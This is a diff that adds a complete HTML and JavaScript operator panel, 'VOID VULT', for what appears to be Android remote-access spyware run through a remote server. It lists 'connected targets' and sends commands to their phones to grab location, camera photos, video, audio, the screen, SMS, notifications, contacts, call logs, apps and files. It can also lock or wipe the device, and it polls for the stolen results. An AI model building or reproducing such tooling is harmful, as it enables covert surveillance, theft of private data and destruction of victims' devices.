@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>VOID VULT</title>
+<style>
+  :root{
+    --bg:#000000;
+    --panel:#0a0a12;
+    --border:#1a1a2e;
+    --accent:#a855f7;
+    --accent2:#22d3ee;
+    --danger:#ff2244;
+    --text:#ffffff;
+    --dim:#6677aa;
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
+  html,body{background:var(--bg);color:var(--text);font-family:'Courier New',monospace;min-height:100vh;overflow-x:hidden;}
+  body{padding:16px;display:flex;flex-direction:column;align-items:center;}
+
+  /* HEADER */
+  .header{width:100%;max-width:440px;display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid var(--border);margin-bottom:20px;}
+  .logo{font-size:22px;letter-spacing:.3em;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:900;}
+  .logo small{display:block;font-size:8px;letter-spacing:.3em;color:var(--dim);font-weight:400;margin-top:2px;}
+  .logout{font-size:10px;color:var(--dim);letter-spacing:.15em;background:none;border:1px solid var(--border);padding:6px 10px;border-radius:8px;cursor:pointer;}
+  .logout:active{background:var(--border);}
+
+  /* SCREENS */
+  .screen{width:100%;max-width:440px;display:none;}
+  .screen.active{display:block;}
+
+  /* LOGIN */
+  .login-wrap{padding:40px 24px;}
+  .login-title{text-align:center;font-size:34px;letter-spacing:.2em;font-weight:900;color:#fff;margin-bottom:4px;}
+  .login-sub{text-align:center;font-size:9px;letter-spacing:.4em;color:var(--dim);margin-bottom:40px;}
+  .field{width:100%;background:#0a0a12;border:1px solid var(--border);border-radius:10px;padding:16px;color:#fff;font-size:14px;font-family:inherit;letter-spacing:.1em;margin-bottom:14px;text-align:center;outline:none;}
+  .field:focus{border-color:var(--accent);}
+  .field::placeholder{color:#333;letter-spacing:.15em;}
+  .btn-main{width:100%;padding:18px;border:none;border-radius:10px;font-family:inherit;font-weight:900;letter-spacing:.25em;font-size:14px;color:#000;background:linear-gradient(90deg,var(--accent),var(--accent2));cursor:pointer;box-shadow:0 0 24px rgba(168,85,247,.4);}
+  .btn-main:active{transform:scale(.98);}
+
+  /* DEVICE LIST */
+  .device-card{background:#0a0a12;border:1px solid var(--border);border-radius:14px;padding:16px;margin-bottom:12px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;}
+  .device-card:active{background:#111122;}
+  .device-card .info{flex:1;}
+  .device-card .dev-id{font-size:16px;font-weight:900;letter-spacing:.15em;color:#fff;}
+  .device-card .dev-model{font-size:11px;color:var(--dim);letter-spacing:.1em;margin-top:2px;}
+  .device-card .status{font-size:9px;letter-spacing:.2em;padding:4px 8px;border-radius:12px;}
+  .device-card .status.online{background:rgba(34,211,238,.15);color:var(--accent2);}
+  .device-card .status.offline{background:rgba(102,119,170,.15);color:var(--dim);}
+
+  /* DEVICE DETAIL */
+  .back-btn{background:none;border:none;color:var(--dim);font-family:inherit;font-size:11px;letter-spacing:.15em;padding:6px 0;margin-bottom:14px;cursor:pointer;}
+  .detail-title{font-size:20px;font-weight:900;letter-spacing:.15em;margin-bottom:6px;}
+  .detail-sub{font-size:10px;color:var(--dim);letter-spacing:.1em;margin-bottom:20px;}
+
+  /* CONTROL GRID */
+  .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px;}
+  .ctrl{background:#0a0a12;border:1px solid var(--border);border-radius:12px;padding:16px 12px;display:flex;flex-direction:column;align-items:center;text-align:center;cursor:pointer;transition:.15s;}
+  .ctrl:active{background:#151530;border-color:var(--accent);}
+  .ctrl .icon{font-size:22px;margin-bottom:8px;}
+  .ctrl .label{font-size:10px;letter-spacing:.15em;color:#cce;font-weight:600;}
+  .ctrl.danger{border-color:rgba(255,34,68,.4);}
+  .ctrl.danger:active{background:rgba(255,34,68,.1);}
+  .ctrl.danger .icon{filter:hue-rotate(-40deg);}
+
+  /* OUTPUT AREA */
+  .output{background:#050510;border:1px solid var(--border);border-radius:10px;padding:14px;font-size:11px;color:#8af;font-family:'Courier New',monospace;line-height:1.5;max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-bottom:14px;}
+  .output .empty{color:#333;text-align:center;padding:20px 0;letter-spacing:.15em;}
+
+  /* BOTTOM NAV */
+  .bottom-nav{width:100%;max-width:440px;position:fixed;bottom:0;left:0;right:0;margin:0 auto;background:#050510;border-top:1px solid var(--border);display:flex;justify-content:space-around;padding:10px 0;z-index:10;}
+  .nav-item{background:none;border:none;color:var(--dim);font-family:inherit;font-size:9px;letter-spacing:.15em;display:flex;flex-direction:column;align-items:center;gap:4px;padding:6px 12px;cursor:pointer;}
+  .nav-item.active{color:var(--accent2);}
+  .nav-item .ic{font-size:18px;}
+
+  /* TOAST */
+  .toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#111122;border:1px solid var(--accent);color:#fff;padding:12px 20px;border-radius:10px;font-size:11px;letter-spacing:.1em;opacity:0;transition:.3s;pointer-events:none;z-index:100;}
+  .toast.show{opacity:1;}
+
+  /* SPINNER */
+  .loading{text-align:center;padding:40px 0;color:var(--dim);font-size:11px;letter-spacing:.2em;}
+  .loading::after{content:'...';animation:dots 1.5s infinite;}
+  @keyframes dots{0%,20%{content:'.'}40%{content:'..'}60%,100%{content:'...'}}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <div class="logo">VOID VULT<small>CONTROL PANEL</small></div>
+  <button class="logout" id="logoutBtn" style="display:none;">LOGOUT</button>
+</div>
+
+<!-- LOGIN SCREEN -->
+<div class="screen active" id="screenLogin">
+  <div class="login-wrap">
+    <div class="login-title">VOID VULT</div>
+    <div class="login-sub">ACCESS YOUR VAULT</div>
+    <input class="field" id="loginUser" placeholder="USERNAME" autocomplete="off">
+    <input class="field" id="loginPass" placeholder="USER ID" type="number" autocomplete="off">
+    <button class="btn-main" id="loginBtn">ENTER VAULT</button>
+  </div>
+</div>
+
+<!-- DEVICE LIST SCREEN -->
+<div class="screen" id="screenList">
+  <div class="detail-title">DEVICES</div>
+  <div class="detail-sub">CONNECTED TARGETS</div>
+  <div id="deviceListContainer">
+    <div class="loading">LOADING</div>
+  </div>
+</div>
+
+<!-- DEVICE DETAIL SCREEN -->
+<div class="screen" id="screenDetail">
+  <button class="back-btn" id="backBtn">&lt; BACK</button>
+  <div class="detail-title" id="detailTitle">—</div>
+  <div class="detail-sub" id="detailSub">—</div>
+
+  <div class="grid">
+    <div class="ctrl" data-cmd="loc"><div class="icon">📍</div><div class="label">LOCATION</div></div>
+    <div class="ctrl" data-cmd="cam"><div class="icon">📸</div><div class="label">BACK CAM</div></div>
+    <div class="ctrl" data-cmd="selfie"><div class="icon">🤳</div><div class="label">SELFIE</div></div>
+    <div class="ctrl" data-cmd="video" data-arg="10"><div class="icon">🎥</div><div class="label">VIDEO 10s</div></div>
+    <div class="ctrl" data-cmd="audio" data-arg="15"><div class="icon">🎤</div><div class="label">AUDIO 15s</div></div>
+    <div class="ctrl" data-cmd="screen"><div class="icon">📱</div><div class="label">SCREEN</div></div>
+    <div class="ctrl" data-cmd="sms"><div class="icon">💬</div><div class="label">SMS</div></div>
+    <div class="ctrl" data-cmd="notif"><div class="icon">🔔</div><div class="label">NOTIF</div></div>
+    <div class="ctrl" data-cmd="contacts"><div class="icon">👤</div><div class="label">CONTACTS</div></div>
+    <div class="ctrl" data-cmd="calls"><div class="icon">📞</div><div class="label">CALLS</div></div>
+    <div class="ctrl" data-cmd="apps"><div class="icon">📦</div><div class="label">APPS</div></div>
+    <div class="ctrl" data-cmd="files" data-arg="/sdcard"><div class="icon">📁</div><div class="label">FILES</div></div>
+    <div class="ctrl" data-cmd="flash"><div class="icon">🔦</div><div class="label">FLASHLIGHT</div></div>
+    <div class="ctrl" data-cmd="toast" data-arg="Hello"><div class="icon">💭</div><div class="label">TOAST</div></div>
+    <div class="ctrl danger" data-cmd="lock"><div class="icon">🔒</div><div class="label">LOCK</div></div>
+    <div class="ctrl danger" data-cmd="wipe"><div class="icon">⚠️</div><div class="label">WIPE</div></div>
+  </div>
+
+  <div class="detail-sub">OUTPUT</div>
+  <div class="output" id="outputBox"><div class="empty">NO OUTPUT YET</div></div>
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottom-nav" id="bottomNav" style="display:none;">
+  <button class="nav-item active" data-screen="screenList"><span class="ic">◉</span>DEVICES</button>
+  <button class="nav-item" data-screen="screenDetail"><span class="ic">⚙</span>CONTROL</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ============================================================
+//   CONFIG
+// ============================================================
+const SERVER = "https://void-vult-server.onrender.com";
+
+// ============================================================
+//   STATE
+// ============================================================
+let state = {
+  token: null,
+  userId: null,
+  currentDevice: null,
+  pollTimer: null
+};
+
+// ============================================================
+//   HELPERS
+// ============================================================
+function $(id){return document.getElementById(id);}
+
+function showToast(msg){
+  const t = $('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'), 2200);
+}
+
+function showScreen(id){
+  document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
+  $(id).classList.add('active');
+}
+
+function esc(s){
+  return String(s).replace(/[&<>]/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+}
+
+// ============================================================
+//   LOGIN
+// ============================================================
+$('loginBtn').addEventListener('click', async ()=>{
+  const u = $('loginUser').value.trim();
+  const p = $('loginPass').value.trim();
+  if(!u || !p){ showToast('Enter username and user ID'); return; }
+  try{
+    const r = await fetch(SERVER+'/login',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({username:u, password:p})
+    });
+    const j = await r.json();
+    if(!j.ok){ showToast('Invalid credentials'); return; }
+    state.token = j.token;
+    state.userId = j.userId;
+    $('logoutBtn').style.display = 'block';
+    $('bottomNav').style.display = 'flex';
+    showToast('Access granted');
+    showScreen('screenList');
+    loadDevices();
+  }catch(e){
+    showToast('Server unreachable');
+  }
+});
+
+$('logoutBtn').addEventListener('click', ()=>{
+  state.token = null;
+  state.userId = null;
+  state.currentDevice = null;
+  if(state.pollTimer) clearInterval(state.pollTimer);
+  $('logoutBtn').style.display = 'none';
+  $('bottomNav').style.display = 'none';
+  showScreen('screenLogin');
+});
+
+// ============================================================
+//   DEVICE LIST
+// ============================================================
+async function loadDevices(){
+  const c = $('deviceListContainer');
+  c.innerHTML = '<div class="loading">LOADING</div>';
+  try{
+    const r = await fetch(SERVER+'/devices');
+    const j = await r.json();
+    if(!j.ok || !j.devices.length){
+      c.innerHTML = '<div class="loading" style="animation:none;">NO DEVICES CONNECTED</div>';
+      return;
+    }
+    c.innerHTML = '';
+    j.devices.forEach(d=>{
+      const el = document.createElement('div');
+      el.className = 'device-card';
+      el.innerHTML = `
+        <div class="info">
+          <div class="dev-id">${esc(d.userId)}</div>
+          <div class="dev-model">${esc(d.device||'?')} • ${esc(d.android||'?')}</div>
+        </div>
+        <div class="status ${d.online?'online':'offline'}">${d.online?'ONLINE':'OFFLINE'}</div>
+      `;
+      el.addEventListener('click', ()=>openDevice(d.userId));
+      c.appendChild(el);
+    });
+  }catch(e){
+    c.innerHTML = '<div class="loading" style="animation:none;">SERVER ERROR</div>';
+  }
+}
+
+// ============================================================
+//   DEVICE DETAIL
+// ============================================================
+async function openDevice(userId){
+  state.currentDevice = userId;
+  $('detailTitle').textContent = userId;
+  $('detailSub').textContent = 'LOADING INFO';
+  $('outputBox').innerHTML = '<div class="empty">NO OUTPUT YET</div>';
+  showScreen('screenDetail');
+  try{
+    const r = await fetch(SERVER+'/device?id='+encodeURIComponent(userId));
+    const j = await r.json();
+    if(j.ok){
+      const online = j.online ? 'ONLINE' : 'OFFLINE';
+      $('detailSub').textContent = (j.device||'?') + ' • ' + (j.android||'?') + ' • ' + online;
+    }
+  }catch(e){}
+  startResultPoll();
+}
+
+$('backBtn').addEventListener('click', ()=>{
+  if(state.pollTimer) clearInterval(state.pollTimer);
+  state.pollTimer = null;
+  showScreen('screenList');
+  loadDevices();
+});
+
+// ============================================================
+//   COMMAND SEND
+// ============================================================
+document.querySelectorAll('.ctrl').forEach(el=>{
+  el.addEventListener('click', async ()=>{
+    if(!state.currentDevice){ showToast('No device selected'); return; }
+    const cmd = el.dataset.cmd;
+    const arg = el.dataset.arg || '';
+
+    if(cmd === 'wipe'){
+      if(!confirm('WIPE THE TARGET DEVICE? This cannot be undone.')) return;
+    }
+
+    try{
+      const r = await fetch(SERVER+'/send',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({userId:state.currentDevice, cmd:cmd, args:arg})
+      });
+      const j = await r.json();
+      if(j.ok) showToast('Command sent: '+cmd.toUpperCase());
+      else showToast('Send failed');
+    }catch(e){
+      showToast('Server error');
+    }
+  });
+});
+
+// ============================================================
+//   RESULT POLLING
+// ============================================================
+function startResultPoll(){
+  if(state.pollTimer) clearInterval(state.pollTimer);
+  state.pollTimer = setInterval(async ()=>{
+    if(!state.currentDevice) return;
+    try{
+      const r = await fetch(SERVER+'/device?id='+encodeURIComponent(state.currentDevice));
+      const j = await r.json();
+      if(j.ok && j.results && j.results.length){
+        const box = $('outputBox');
+        box.innerHTML = '';
+        j.results.slice(-10).reverse().forEach(res=>{
+          const line = document.createElement('div');
+          line.style.marginBottom = '8px';
+          line.innerHTML = '<span style="color:#a855f7;">&gt; '+esc(res.cmd)+'</span><br>'+esc(res.data||'')+'<br><span style="color:#445;">'+new Date(res.at).toLocaleTimeString()+'</span>';
+          box.appendChild(line);
+        });
+      }
+    }catch(e){}
+  }, 3000);
+}
+
+// ============================================================
+//   NAV
+// ============================================================
+document.querySelectorAll('.nav-item').forEach(el=>{
+  el.addEventListener('click', ()=>{
+    document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+    el.classList.add('active');
+    showScreen(el.dataset.screen);
+    if(el.dataset.screen === 'screenList') loadDevices();
+  });
+});
+
+// ============================================================
+//   AUTO-LOGIN if session exists
+// ============================================================
+// (skipped — session is in-memory only for simplicity)
+</script>
+</body>
+</html>
